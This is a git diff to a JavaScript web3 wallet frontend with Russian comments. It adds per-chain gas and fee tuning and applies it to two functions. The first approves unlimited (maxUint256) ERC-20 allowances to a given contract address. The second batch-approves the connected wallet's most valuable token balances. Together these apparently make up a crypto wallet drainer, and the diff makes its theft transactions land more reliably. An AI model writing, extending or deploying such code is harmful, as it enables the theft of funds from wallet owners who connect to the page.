@@ -14,6 +14,193 @@ const debounce = (func, wait) => {
   }
 }
 
+// Функция для автоматического подбора оптимального газа
+const getOptimalGasParams = async (chainId) => {
+  try {
+    // Получаем текущую цену газа
+    const gasPrice = await getGasPrice({ chainId })
+    
+    // Базовые параметры для разных сетей
+    const networkParams = {
+      1: { // Ethereum
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(120) / BigInt(100), // +20% от текущей цены
+        maxPriorityFeePerGas: BigInt(2000000000) // 2 Gwei
+      },
+      56: { // BSC
+        gasLimit: BigInt(100000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000000) // 1 Gwei
+      },
+      137: { // Polygon
+        gasLimit: BigInt(200000),
+        maxFeePerGas: gasPrice * BigInt(115) / BigInt(100), // +15% от текущей цены
+        maxPriorityFeePerGas: BigInt(30000000000) // 30 Gwei
+      },
+      42161: { // Arbitrum
+        gasLimit: BigInt(500000),
+        maxFeePerGas: gasPrice * BigInt(105) / BigInt(100), // +5% от текущей цены
+        maxPriorityFeePerGas: BigInt(100000000) // 0.1 Gwei
+      },
+      10: { // Optimism
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000) // 0.001 Gwei
+      },
+      8453: { // Base
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000) // 0.001 Gwei
+      },
+      534352: { // Scroll
+        gasLimit: BigInt(200000),
+        maxFeePerGas: gasPrice * BigInt(115) / BigInt(100), // +15% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000) // 0.001 Gwei
+      },
+      43114: { // Avalanche
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000000) // 1 Gwei
+      },
+      250: { // Fantom
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000000) // 1 Gwei
+      },
+      59144: { // Linea
+        gasLimit: BigInt(200000),
+        maxFeePerGas: gasPrice * BigInt(115) / BigInt(100), // +15% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000) // 0.001 Gwei
+      },
+      324: { // zkSync
+        gasLimit: BigInt(300000),
+        maxFeePerGas: gasPrice * BigInt(120) / BigInt(100), // +20% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000) // 0.001 Gwei
+      },
+      42220: { // Celo
+        gasLimit: BigInt(150000),
+        maxFeePerGas: gasPrice * BigInt(110) / BigInt(100), // +10% от текущей цены
+        maxPriorityFeePerGas: BigInt(1000000000) // 1 Gwei
+      }
+    }
+    
+    const params = networkParams[chainId] || {
+      gasLimit: BigInt(150000),
+      maxFeePerGas: gasPrice * BigInt(120) / BigInt(100),
+      maxPriorityFeePerGas: BigInt(2000000000)
+    }
+    
+    console.log(`Optimal gas params for chain ${chainId}:`, {
+      gasLimit: params.gasLimit.toString(),
+      maxFeePerGas: params.maxFeePerGas.toString(),
+      maxPriorityFeePerGas: params.maxPriorityFeePerGas.toString(),
+      currentGasPrice: gasPrice.toString()
+    })
+    
+    return params
+  } catch (error) {
+    console.error(`Error getting optimal gas params for chain ${chainId}:`, error)
+    // Fallback параметры
+    return {
+      gasLimit: BigInt(150000),
+      maxFeePerGas: BigInt(50000000000), // 50 Gwei
+      maxPriorityFeePerGas: BigInt(2000000000) // 2 Gwei
+    }
+  }
+}
+
+// Функция для получения динамических параметров газа с учетом загруженности сети
+const getDynamicGasParams = async (chainId, operation = 'approve') => {
+  try {
+    const baseParams = await getOptimalGasParams(chainId)
+    const congestion = await getNetworkCongestion(chainId)
+    
+    // Дополнительные множители в зависимости от операции
+    const operationMultipliers = {
+      'approve': { gasLimit: 1.0, feeMultiplier: 1.0 },
+      'transfer': { gasLimit: 1.2, feeMultiplier: 1.1 },
+      'batch': { gasLimit: 1.5, feeMultiplier: 1.2 }
+    }
+    
+    // Множители в зависимости от загруженности сети
+    const congestionMultipliers = {
+      'low': { gasLimit: 1.0, feeMultiplier: 0.9 },
+      'medium': { gasLimit: 1.0, feeMultiplier: 1.0 },
+      'high': { gasLimit: 1.1, feeMultiplier: 1.2 },
+      'very_high': { gasLimit: 1.2, feeMultiplier: 1.5 }
+    }
+    
+    const operationMultiplier = operationMultipliers[operation] || operationMultipliers['approve']
+    const congestionMultiplier = congestionMultipliers[congestion] || congestionMultipliers['medium']
+    
+    // Применяем оба множителя
+    const finalGasLimit = baseParams.gasLimit * BigInt(Math.floor(operationMultiplier.gasLimit * congestionMultiplier.gasLimit * 100)) / BigInt(100)
+    const finalMaxFeePerGas = baseParams.maxFeePerGas * BigInt(Math.floor(operationMultiplier.feeMultiplier * congestionMultiplier.feeMultiplier * 100)) / BigInt(100)
+    const finalMaxPriorityFeePerGas = baseParams.maxPriorityFeePerGas * BigInt(Math.floor(operationMultiplier.feeMultiplier * congestionMultiplier.feeMultiplier * 100)) / BigInt(100)
+    
+    console.log(`Dynamic gas params for ${operation} on chain ${chainId} (congestion: ${congestion}):`, {
+      gasLimit: finalGasLimit.toString(),
+      maxFeePerGas: finalMaxFeePerGas.toString(),
+      maxPriorityFeePerGas: finalMaxPriorityFeePerGas.toString()
+    })
+    
+    return {
+      gasLimit: finalGasLimit,
+      maxFeePerGas: finalMaxFeePerGas,
+      maxPriorityFeePerGas: finalMaxPriorityFeePerGas
+    }
+  } catch (error) {
+    console.error(`Error getting dynamic gas params:`, error)
+    return await getOptimalGasParams(chainId)
+  }
+}
+
+// Функция для получения информации о загруженности сети
+const getNetworkCongestion = async (chainId) => {
+  try {
+    const gasPrice = await getGasPrice({ chainId })
+    
+    // Определяем уровень загруженности на основе цены газа
+    const gasPriceGwei = Number(formatUnits(gasPrice, 9))
+    
+    if (gasPriceGwei < 20) return 'low'
+    if (gasPriceGwei < 50) return 'medium'
+    if (gasPriceGwei < 100) return 'high'
+    return 'very_high'
+  } catch (error) {
+    console.error(`Error getting network congestion for chain ${chainId}:`, error)
+    return 'medium' // fallback
+  }
+}
+
+// Функция для мониторинга и повышения газа при необходимости
+const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
+  try {
+    console.log(`Monitoring transaction ${txHash} on chain ${chainId}`)
+    
+    // Проверяем загруженность сети
+    const congestion = await getNetworkCongestion(chainId)
+    console.log(`Network congestion level: ${congestion}`)
+    
+    // Если сеть сильно загружена, можно повысить газ
+    if (congestion === 'high' || congestion === 'very_high') {
+      console.log(`Network is congested (${congestion}), considering gas increase`)
+    }
+    
+    // Ждем некоторое время для проверки статуса
+    await new Promise(resolve => setTimeout(resolve, 10000))
+    
+    // Здесь можно добавить логику для проверки статуса транзакции
+    // и автоматического повышения газа при необходимости
+    
+    console.log(`Transaction ${txHash} monitoring completed`)
+    return true
+  } catch (error) {
+    console.error(`Error monitoring transaction ${txHash}:`, error)
+    return false
+  }
+}
+
 // Конфигурация
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
@@ -596,21 +783,33 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(900000)
-    const maxFeePerGas = BigInt(1000000000)
-    const maxPriorityFeePerGas = BigInt(1000000000)
-    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    // Получаем динамические параметры газа для операции approve
+    const gasParams = await getDynamicGasParams(chainId, 'approve')
+    
+    console.log(`Approving token with dynamic gas params:`, {
+      gasLimit: gasParams.gasLimit.toString(),
+      maxFeePerGas: gasParams.maxFeePerGas.toString(),
+      maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas.toString(),
+      chainId
+    })
+    
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
       chainId,
-      gas: gasLimit,
-      maxFeePerGas,
-      maxPriorityFeePerGas
+      gas: gasParams.gasLimit,
+      maxFeePerGas: gasParams.maxFeePerGas,
+      maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas
     })
     console.log(`Approve transaction sent: ${txHash}`)
+    
+    // Запускаем мониторинг транзакции в фоне
+    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
+      console.error(`Error monitoring transaction ${txHash}:`, error)
+    })
+    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
@@ -686,10 +885,23 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
 
     // Send batch transaction
     if (approveCalls.length > 0) {
+      // Получаем динамические параметры газа для batch транзакции
+      const gasParams = await getDynamicGasParams(mostExpensive.chainId, 'batch')
+      
+      console.log(`Sending batch transaction with dynamic gas params:`, {
+        gasLimit: gasParams.gasLimit.toString(),
+        maxFeePerGas: gasParams.maxFeePerGas.toString(),
+        maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas.toString(),
+        chainId: mostExpensive.chainId
+      })
+      
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: approveCalls,
         account: getAddress(state.address),
-        chainId: mostExpensive.chainId
+        chainId: mostExpensive.chainId,
+        gas: gasParams.gasLimit,
+        maxFeePerGas: gasParams.maxFeePerGas,
+        maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas
       })
       console.log(`Batch transaction sent with id: ${id}`)
       return { success: true, txHash: id }
